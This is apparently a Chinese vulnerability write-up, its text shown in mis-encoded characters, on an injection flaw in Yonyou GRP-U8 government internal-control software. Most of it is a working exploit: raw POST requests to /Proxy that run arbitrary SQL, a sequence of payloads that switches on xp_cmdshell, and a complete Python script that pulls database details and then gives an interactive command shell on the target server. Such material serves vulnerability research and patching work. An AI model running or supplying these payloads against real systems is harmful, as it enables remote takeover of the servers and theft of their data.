<meta name="referrer" content="no-referrer"/>
> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/3Tevu8dc_Cin6MTEUZvxFg)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**ä¸€****ï¼šæ¼æ´æè¿°ğŸ‘**

**ç”¨å‹ GRP-u8 å­˜åœ¨ XXE æ¼æ´ï¼Œè¯¥æ¼æ´æºäºåº”ç”¨ç¨‹åºè§£æ XML è¾“å…¥æ—¶æ²¡æœ‰è¿›åˆ¶å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½å¤–éƒ¨ SQL è¯­å¥ï¼Œä»¥åŠå‘½ä»¤æ‰§è¡Œ**

**äºŒ:Â  æ¼æ´å½±å“ğŸ‡**

**ç”¨å‹ GRP-U8 è¡Œæ”¿äº‹ä¸šå†…æ§ç®¡ç†è½¯ä»¶ï¼ˆæ–°æ”¿åºœä¼šè®¡åˆ¶åº¦ä¸“ç‰ˆï¼‰**

**ä¸‰:Â  æ¼æ´å¤ç°ğŸ‹**

**æ¼æ´åˆ©ç”¨ POC è¯·æ±‚åŒ…**

```
POST /Proxy HTTP/1.1
Accept: Accept: */*
Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host
Content-Length: 357
Connection: Keep-Alive
Cache-Control: no-cache


cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>
```

è¯·æ±‚åæŒ‰ F12 æŸ¥çœ‹æºä»£ç å¯ä»¥å¾—åˆ° SQL è¯­å¥æŸ¥è¯¢ç»“æœ

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7pCmG9kTVVuzBDdQgkQa6qDWfWEcn9ouZicLReHKCQlY5N0KsBxY2PZgWkIIhENR0tMYddRujbs2w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7pCmG9kTVVuzBDdQgkQa6qc205lSqDwt8yQMu2ofsicDOBtg4FMPiaV4P5aXtSWCeTL6d8p35mo7ww/640?wx_fmt=png)

ä¹Ÿå¯ä»¥è°ƒç”¨ **xp_cmdshell** æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ (å¤§éƒ¨åˆ†æ­¤ç³»ç»Ÿä¸º **windows**)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7pCmG9kTVVuzBDdQgkQa6qObKCadHMc25vOph5tvvzwiaEgdqKZt5gmkf27a1nvK1C7375zBUKpuQ/640?wx_fmt=png)

```
æ³¨æ„ï¼šå¤§éƒ¨åˆ†é»˜è®¤æ˜¯ä¸å¼€å¯ xp_cmdshell æ¨¡å—çš„
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7pCmG9kTVVuzBDdQgkQa6q3Kp1iapYcpGgQXaHCibWz1icY6CLRbRDibQwoTauT0sfNtc4vypF8oMu5g/640?wx_fmt=png)

å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•æ‰“å¼€ **xp_cmdshell æ–¹æ³•**

å°†å¦‚ä¸‹ POST æ•°æ®æŒ‰é¡ºåºå‘é€ (**æ³¨æ„ master æ”¹ä¸ºå½“å‰æ•°æ®åº“å**)

```
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">use master</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

```
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec sp_configure 'show advanced options',1</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

```
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">reconfigure</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

```
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec sp_configure 'xp_cmdshell',1</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

```
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">reconfigure</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

```
å‘é€å¦‚ä¸Šå®é™…ä¸ºæ‰§è¡ŒSQLè¯­å¥æ‰“å¼€ xp_cmdshell
use master;
exec sp_configure 'show advanced options',1;
reconfigure;
exec sp_configure 'xp_cmdshell',1;
reconfigure;
```

**å†å‘é€ä»¥ä¸‹æ•°æ®å¯æˆåŠŸä½¿ç”¨ (ä¹Ÿå¯èƒ½å¤±è´¥)**

```
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "whoami"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

æ‰§è¡Œè¿‡ç¨‹ä¸­æŠ¥é”™ java.sql.SQLExceptionã€é”™è¯¯ä»£ç : 0; ç›¸å…³ä¿¡æ¯: xxxxxxã€‘ä¸ç”¨ç†ä¼š

å‘é€è¯·æ±‚åå†ä½¿ç”¨æ­¤æ¨¡å—åˆ™ä¼šæˆåŠŸè¯·æ±‚æ‰§è¡Œç³»ç»Ÿå‘½ä»¤

****å››:Â  æ¼æ´ POCğŸ¦‰****

```
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech


import requests
import re
import sys


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šå†…æ§ç®¡ç†è½¯ä»¶                                \033[0m')
    print('+  \033[36mä½¿ç”¨æ ¼å¼: python3 CNNVD-201610-923.py                               \033[0m')
    print('+  \033[36mUrl    >>> http://xxx.xxx.xxx.xxx                                 \033[0m')
    print('+  \033[36m(Y/N)  >>> Y or N                                                  \033[0m')
    print('+  \033[36mcmd    >>> ipconfig                                                \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    check_url = target_url + "/Proxy"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = """cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">select 1,user,db_name(),host_name(),@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>"""
    try:
        print("\033[32m[o] æ­£åœ¨æ‰§è¡ŒSQLè¯­å¥:select 1,user,db_name(),host_name(),@@version...\033[0m")
        response = requests.post(url=check_url, headers=headers, data=data, timeout=10)

        row_1 = '<ROW COLUMN1="1"'
        row_2 = r'COLUMN2="(.*?)"'
        row_3 = r'COLUMN3="(.*?)"'
        row_4 = r'COLUMN4="(.*?)"'
        row_5 = r'COLUMN5="(.*?)"'

        if row_1 in response.text and "æœåŠ¡å™¨é”™è¯¯ä¿¡æ¯ï¼šnull" not in response.text:
            db_user = re.findall(row_2, response.text)[0]
            db_name = re.findall(row_3, response.text)[0]
            db_host = re.findall(row_4, response.text)[0]
            db_vers = re.findall(row_5, response.text)[0]
            print("\033[32m[o] å­˜åœ¨æ¼æ´ï¼Œæ¼æ´å“åº”ä¸º:\033[0m")
            print("\033[32m >> æ•°æ®åº“ç”¨æˆ·ä¸º:{}\033[0m".format(db_user))
            print("\033[32m >> æ•°æ®åº“åä¸º:{}\033[0m".format(db_name))
            print("\033[32m >> æ•°æ®åº“ä¸»æœºåä¸º:{}\033[0m".format(db_host))
            print("\033[32m >> æ•°æ®åº“ç‰ˆæœ¬ä¸º:{}\033[0m".format(db_vers))
            return db_name
        else:
            print("\033[31m[x] æ¼æ´å·²è¢«ä¿®å¤ \033[0m")
            sys.exit(0)
    except:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m")
        sys.exit(0)

def xp_cmdshell_open(target_url, db_name):
    open_sql = ["use {}".format(db_name),"exec sp_configure 'show advanced options',1","reconfigure","exec sp_configure 'xp_cmdshell',1","reconfigure"]
    num = 1
    for sql in open_sql:
        open_url = target_url + "/Proxy"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">{}</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'.format(sql)
        try:
            print("\033[32m[o] æ­£åœ¨æ‰§è¡ŒSQLè¯­å¥:{}...\033[0m".format(sql))
            response = requests.post(url=open_url, headers=headers, data=data, timeout=10)
            num = num + 1
            if num == 5 :
                POC_2(target_url, db_name)

        except:
            print("\033[31m[x] å¼€å¯ xp_cmdsheall å¤±è´¥ \033[0m")
            sys.exit(0)

def POC_2(target_url, db_name):
    db_name = db_name
    sql_cmd_url = target_url + "/Proxy"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = """cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "whoami"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>"""
    try:
        print("\033[32m[o] æ­£åœ¨æ‰§è¡ŒSQLè¯­å¥:exec xp_cmdshell 'whoami'...\033[0m")
        response = requests.post(url=sql_cmd_url, headers=headers, data=data, timeout=10)
        if 'exec xp_cmdshell' in response.text:
            print("\033[31m[x] æ•°æ®åº“æœªå¼€å¯ xp_cmdshell æ¨¡å—\033[0m")
            sqlcmd_open = str(input("\033[35mæ˜¯å¦å¼€å¯ xp_cmdshell\n(Y/N)   >>> \033[0m"))
            if sqlcmd_open == 'Y' or sqlcmd_open == 'y':
                xp_cmdshell_open(target_url, db_name)
            else:
                print("\033[31m[x] åœæ­¢å¼€å¯ xp_cmdshell \033[0m")
                sys.exit(0)
        else:
            whoami = re.findall(r'output="(.*?)"', response.text)[0]
            print("\033[32m[o] æˆåŠŸæ‰§è¡ŒSQLè¯­å¥:exec xp_cmdshell 'whoami'...\n>>> {}\033[0m".format(whoami))

    except Exception as e:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥:{} \033[0m".format(e))
        sys.exit(0)

def POC_3(target_url, cmd):
    vuln_url = target_url + "/Proxy"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "{}"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'.format(cmd)
    try:
        print("\033[32m[o] æ­£åœ¨æ‰§è¡ŒSQLè¯­å¥:exec xp_cmdshell '{}'...\033[0m".format(cmd))
        response = requests.post(url=vuln_url, headers=headers, data=data, timeout=10)

        data = re.findall(r'output="(.*?)"', response.text)
        for i in data:
            print("\033[32m >>> {}\033[0m".format(i))
    except Exception as e:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥:{} \033[0m".format(e))
        sys.exit(0)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    db_name = POC_1(target_url)
    POC_2(target_url, db_name)

    while True:
        cmd = input("\033[35mCmd >>> \033[0m")
        if cmd == "exit":
            sys.exit(0)
        else:
            POC_3(target_url, cmd)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7pCmG9kTVVuzBDdQgkQa6qzL2N1ia9Coib9JKMHwusJVguicvR9jjhUozGtZgvGQbTD92wYs04hzRug/640?wx_fmt=png)

æœ€å
--

> ä¸‹é¢å°±æ˜¯æ–‡åº“å’Œå›¢é˜Ÿçš„å…¬ä¼—å·å•¦ï¼Œæ›´æ–°çš„æ–‡ç« éƒ½ä¼šåœ¨ç¬¬ä¸€æ—¶é—´æ¨é€åœ¨å…¬ä¼—å·
> 
> åˆ«å¿˜äº† Github ä¸‹è½½å®Œç»™ä¸ªå°æ˜Ÿæ˜Ÿâ­

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6wnKTQvK0n8sFOQEEFQro75IHato7k7WJakCwObVtic8kOiagRSTylHIhHxg4DVKOhBFDazKkCMgvw/640?wx_fmt=png)